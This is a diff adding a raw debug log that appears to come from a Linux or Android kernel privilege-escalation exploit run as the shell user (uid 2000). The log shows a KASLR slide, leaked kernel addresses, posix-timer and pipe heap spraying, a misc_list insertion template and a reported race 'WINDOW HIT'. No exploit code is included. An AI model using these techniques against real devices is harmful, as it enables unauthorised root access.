@@ -1,0 +1,32 @@
+[ENTER] pid=18594 argc=4
+[SAFE] 已把 pid=18594 的 oom_score_adj 降到 -1000 (防 OOM 杀掉挂起实例)
+[N] norelay=1: relay_q 全部改为直写 tracefs (uid=2000)
+[PS] PURESH: 纯 shell (no relay/no kmem); stage1 insert; slide=0x23fac80000 holes=24
+[B0c] slide=0x23fac80000 (命令行 -s) cred_cs=0xffffffe40ae638d4 timer_cs=0xffffffe40af3f748 task_cs=0xffffffe40ae130a8 self_tid=18594
+== wr1: pid=18594 ncpu=6 vcpu=1 ntimer=631 nfill=6 npipe=64 clock=THREAD(-t) spray=pipe
+[B0a] 关键参数: thread_clock=1 file_spray=0MB attempts=6 force_hit=0 selfverify=0 execpath='/proc/self/exe' kill_us=-1
+[B0] uid=2000 euid=2000 gid=2000 egid=2000
+[B0b] PURESH: filemap add/delete 已开 (纯 shell pfn 通道)
+[B1a] probe=18597 setresgid(2000)=0 errno=1
+[B1b] 本进程 kmem_cache_alloc 记录 0 条, 最后 6 条:
+[SM] B1 leak tid=18594 cred=0 recs=0 (轮 1/0 off=0x4)
+[B1] cred: records=0 va=0 | probe_task: records=0 va=0 (tid=18594)
+[B1c] cred 记录:
+[B1c] task 记录:
+[B1] -P 绝对地址写: 跳过 probe_task 依赖 (records=0)
+[B1] 目标模式=stage1 插入 misc_list (不需要 cred 地址)
+[B6] fillers ready=6 [DECBAF]
+[R0b] 轮 1/1 t=870956ms pid=18594 pgid=18594 sid=18594 oom=-1000 cgroup=[8:groupsched:/default]
+---- attempt 1/6 ----
+[B2h] 填洞后 holes=0 (filler 进程=0)
+[PS] 空洞文件 ino=48433 wrote=512 add=512
+[B12T] 整页自洽 slots=12 skip=3 (每槽 parent=(misc-8)|1 right=Pnode left=0)
+[B12I] 插入模板 off=0xf58 aux=0x400 P=0x400 Pnode=0x418 Q=0x580 F=0x640 misc_list=0xffffffe40e247860 (slide=0x23fac80000)
+[PS] 模板预置: common_pfn=1240321 node=0xffffff812ed01f58 Pnode=0xffffff812ed01418 wrv=0xffffff812ed01418 benign=0
+[PS] 空洞 pairs=24 fadvise_ok=48 pfn: 2909036 1209508 1209510 1229056 1229058 1236624 1236626 2889708 2889710 349736 349738 350892 350894 2448944 2448946 1242408 1242410 1232320 1232322 1238976 1238978 1236708 1236710 1240320
+[PS] victim=18605 timers=631 holes=0 arm_i=29 (首个满 slab 的最后对象)
+[B2e] 原始几何(未删 timer): 全部 631 个 timer 保留, tv[29] 为全局最后创建
+[B7] slabinfo(pre-go) posix_timers_cache    810    810    272   30    2 : tunables    0    0    0 : slabdata     27     27      0
+[B8] zombie=Z comm='timer-exec' in 109571us | ku=-1 | reads=64 opens=76873 err=0 | go+271us det+39us kill+310us
+== WINDOW HIT (attempt 1)
+[B8b] slabinfo(at-hit) posix_timers_cache    810    810    272   30    2 : tunables    0    0    0 : slabdata     27     27      0
